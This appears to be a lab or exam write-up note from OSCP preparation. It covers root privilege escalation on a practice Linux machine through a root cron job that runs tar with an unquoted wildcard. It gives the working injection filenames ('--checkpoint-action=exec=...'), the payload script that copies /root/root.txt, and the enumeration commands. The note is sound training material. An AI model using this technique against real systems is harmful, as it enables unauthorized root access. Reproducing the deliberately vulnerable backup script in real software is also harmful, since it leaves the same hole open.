---
type: machine-phase
project: OSCP-Exam-PoC
machine: HA-01
difficulty: Hard
phase: privilege-escalation
status: completed
platform: Linux
initial_user: devops
privilege_escalation: Cron job with tar wildcard injection
services:
  - cron
  - tar
tags:
  - oscp
  - hard
  - linux
  - privilege-escalation
  - cron
  - tar
  - wildcard-injection
root_flag_submitted: true
---
# HA-01 — Root Privilege Escalation

> **Flag completion:** Root flag obtained and submitted (confirmed by the examination participant). Public value: `IT{FLAG-SECRET}`.

## 1. Objective

**Objective:** Escalate privileges from the `devops` account to root and retrieve the contents of `/root/root.txt`.

**Initial access:** SSH session as `devops`.

See [[Difficulty Levels/Hard/HA-01/user]] for the Redis RDB persistence attack used to obtain SSH access.

The privilege-escalation path was a root-owned cron job that executed a vulnerable `tar` command against a directory writable by `devops`.

## 2. Initial Enumeration

### 2.1 Sudo Availability

Attempted to enumerate sudo privileges:

```
sudo -l
```

Output:

```
-bash: sudo: command not found
```

The `sudo` binary was not installed. Enumeration continued without relying on sudo.

### 2.2 SUID Enumeration

Command:

```
find / -type f -perm -4000 -printf '%m %u:%g %p\n' 2>/dev/null | sort
```

Output:

```
4755 root:root /usr/bin/chfn
4755 root:root /usr/bin/chsh
4755 root:root /usr/bin/gpasswd
4755 root:root /usr/bin/mount
4755 root:root /usr/bin/newgrp
4755 root:root /usr/bin/passwd
4755 root:root /usr/bin/su
4755 root:root /usr/bin/umount
4755 root:root /usr/lib/openssh/ssh-keysign
```

No immediately useful SUID exploitation path was identified.

### 2.3 Linux Capabilities

Command:

```
getcap -r / 2>/dev/null
```

Output:

```

```

No capability entries were returned.

### 2.4 Cron Enumeration

Inspected the system crontab:

```
cat /etc/crontab
```

Relevant contents:

```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
17 * * * * root cd / && run-parts --report /etc/cron.hourly
25 6 * * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6 * * 7 root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6 1 * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

Inspected `/etc/cron.d/`:

```
ls -la /etc/cron.d/
```

A file named `maint` was present:

```
-rw-r--r-- 1 root root 83 Nov 3 11:18 maint
```

Read its contents:

```
cat -n /etc/cron.d/maint
```

Output:

```
# m h dom mon dow user command
* * * * * root /opt/maint/backup.sh >/dev/null 2>&1
```

The job executes every minute as `root`.

The command was independently checked to confirm the complete redirection syntax:

```
sed -n '2l' /etc/cron.d/maint
```

Output:

```
* * * * * root /opt/maint/backup.sh >/dev/null 2>&1$
```

## 3. Vulnerable Backup Script

Inspected the cron target:

```
cat -n /opt/maint/backup.sh
```

Output:

```
#!/bin/sh
# Root-owned maintenance job (runs from cron as root every minute).
# VULNERABLE BY DESIGN: archives the spool with a wildcard, so attacker-supplied
# filenames like '--checkpoint-action=exec=...' are interpreted by tar as flags
# (GTFOBins: tar wildcard injection).
cd /opt/maint/spool 2>/dev/null || exit 0
tar -czf /opt/maint/backup.tar.gz * 2>/dev/null
```

The critical operation was:

```
tar -czf /opt/maint/backup.tar.gz *
```

The unquoted wildcard expands to filenames in the current directory. GNU `tar` can interpret specially crafted filenames beginning with `--` as command-line options.

This creates a **tar wildcard injection** opportunity.

Because the cron job runs as root, a command executed through the vulnerable tar operation also runs with root privileges.

## 4. Permission Analysis

Checked the relevant directory permissions:

```
ls -ld /opt
ls -ld /opt/maint
ls -l /opt/maint/backup.sh
ls -ld /opt/maint/spool
```

Observed permissions:

```
drwxr-xr-x 1 root root 4096 Nov 3 14:01 /opt
drwxr-xr-x 1 root root 4096 Nov 5 08:12 /opt/maint
-rwxr-xr-x 1 root root 367 Nov 3 11:18 /opt/maint/backup.sh
drwxr-xr-x 1 devops devops 4096 Nov 3 14:01 /opt/maint/spool
```

The relevant distinction:

|Path|Ownership|Significance|
|---|---|---|
|`/opt`|`root:root`|Not writable by `devops`|
|`/opt/maint`|`root:root`|Not writable by `devops`|
|`/opt/maint/backup.sh`|`root:root`|Root-owned script|
|`/opt/maint/spool`|`devops:devops`|Writable by `devops`|

Verified write access:

```
test -w /opt/maint/spool && echo "WRITABLE" || echo "NOT WRITABLE"
```

Output:

```
WRITABLE
```

The spool directory was empty during inspection.

This was the exploitable permission boundary: `devops` could control filenames consumed by a root-executed backup command.

## 5. Exploitation — Tar Wildcard Injection

### 5.1 Prepare a Root-Executed Script

The target did not have `vim`, `vi`, or `nano` installed. Each editor command returned:

```
-bash: <editor>: command not found
```

Instead of installing an editor, created the script using `printf`.

Changed into the writable spool directory:

```
cd /opt/maint/spool
```

Created `root-flag.sh`:

```
printf '%s\n' \
'#!/bin/sh' \
'cat /root/root.txt > /opt/maint/spool/root.txt' \
'chmod 644 /opt/maint/spool/root.txt' \
> root-flag.sh

chmod 700 root-flag.sh
```

Script contents:

```
#!/bin/sh
cat /root/root.txt > /opt/maint/spool/root.txt
chmod 644 /opt/maint/spool/root.txt
```

The script copies the protected root flag into the writable spool directory and changes the resulting file permissions so that `devops` can read it.

### 5.2 Create Tar Option-Injection Filenames

From the same directory:

```
cd /opt/maint/spool

touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh root-flag.sh'
```

These filenames are interpreted as tar options when the cron script expands `*` and passes the resulting arguments to `tar`.

The injected options configure a checkpoint and execute:

```
sh root-flag.sh
```

Because the cron job invokes the vulnerable backup script as root, the injected command executes with root privileges.

### 5.3 Wait for Cron Execution

The cron entry runs every minute:

```
* * * * * root /opt/maint/backup.sh >/dev/null 2>&1
```

Waited for the scheduled execution.

The root-owned cron process executed the injected script, which copied `/root/root.txt` to:

```
/opt/maint/spool/root.txt
```

### 5.4 Retrieve the Root Flag

Read the resulting file:

```
cat /opt/maint/spool/root.txt
```

The root flag was successfully retrieved.

**Result:** I reported that the root flag was obtained and the HA-01 machine was completed.

**Flag outcome:** Obtained and submitted (participant-confirmed). Public value: `IT{FLAG-SECRET}`.

## 6. Attack Chain Summary

```
SSH access as devops
        |
        v
Enumerate local privilege-escalation paths
        |
        v
Discover /etc/cron.d/maint
        |
        v
Identify root cron job running every minute
        |
        v
Inspect /opt/maint/backup.sh
        |
        v
Identify tar wildcard expansion
        |
        v
Discover devops-writable /opt/maint/spool
        |
        v
Create root-flag.sh
        |
        v
Create malicious --checkpoint filenames
        |
        v
Root cron executes tar with injected options
        |
        v
/root/root.txt copied to spool directory
        |
        v
Read /opt/maint/spool/root.txt
        |
        v
ROOT FLAG RETRIEVED
```

## 7. Evidence Registry

|Evidence|Location / observation|Purpose|
|---|---|---|
|Sudo unavailable|`sudo -l`|Established that sudo-based enumeration was unavailable|
|SUID enumeration|`find / -type f -perm -4000 ...`|Enumerated SUID executables|
|Capability enumeration|`getcap -r /`|No capability entries returned|
|Cron configuration|`/etc/cron.d/maint`|Established root execution every minute|
|Cron command verification|`sed -n '2l' /etc/cron.d/maint`|Confirmed the complete cron command|
|Vulnerable script|`/opt/maint/backup.sh`|Exposed the wildcard passed to tar|
|Directory permissions|`/opt/maint/spool`|Confirmed `devops` write access|
|Payload script|`/opt/maint/spool/root-flag.sh`|Copied the root flag into the spool|
|Injection filenames|`--checkpoint=1` and `--checkpoint-action=exec=sh root-flag.sh`|Triggered command execution through tar|
|Retrieved flag|`/opt/maint/spool/root.txt`|Confirmed successful root-flag retrieval|

## 8. Lessons Learned

1. **Inspect scheduled tasks.** Root-owned cron jobs can expose privilege-escalation paths even when sudo is unavailable.
    
2. **Trace writable directories.** A root-owned script may be secure against direct modification while consuming attacker-controlled files from a writable directory.
    
3. **Treat wildcard expansion carefully.** Passing an unquoted `*` to utilities such as GNU tar can allow filenames to be interpreted as options.
    
4. **Understand execution context.** The cron job's execution identity determines the privileges inherited by the injected command.
    
5. **Adapt to minimal target environments.** Editors were unavailable, so `printf` provided a way to create the payload without installing additional tools.
    
6. **Confirm the result through an observable artifact.** The retrieved `/root/root.txt` content established completion of the root objective.
    

## 9. Final Result

- Initial account: `devops`
    
- Privilege-escalation vector: Root cron job with GNU tar wildcard injection
    
- Root execution: Achieved through the scheduled backup process
    
- Objective: Retrieve `/root/root.txt`
    
- Result: **Completed**
    
- **Flag outcome:** Obtained and submitted (participant-confirmed). Public value: `IT{FLAG-SECRET}`.
    
- Cleanup: Not confirmed in the examination record
    

The documented result is local root-level command execution through the vulnerable cron job. No separate interactive root shell or `id` output confirming a root shell was preserved.

## 10. Related Notes

- [[HA-01 Overview]]
    
- [[Difficulty Levels/Hard/HA-01/user]]
    
- [[Exam Context/Exam Timeline|Exam Timeline]]
    
- [[Dashboard]]